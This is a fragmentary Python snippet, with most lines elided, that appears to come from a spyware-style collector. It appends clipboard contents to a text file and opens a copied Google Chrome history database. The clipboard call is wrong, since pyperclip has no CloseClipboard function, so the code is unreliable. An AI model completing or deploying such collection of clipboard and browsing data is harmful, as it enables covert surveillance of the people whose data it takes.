...
import pyperclip  # get clipboard information
...
def copy_clipboard():
    ...
    with open("clipboard.txt", "a") as f:
        ...
        pyperclip.CloseClipboard()  # get the clipboard data and store it in pasted_data
...
conn = sqlite3.connect(
    'C:\\Users\\username\\Desktop\\history1')  # connect to the google chrome history database "add your path"
cursor = conn.cursor()
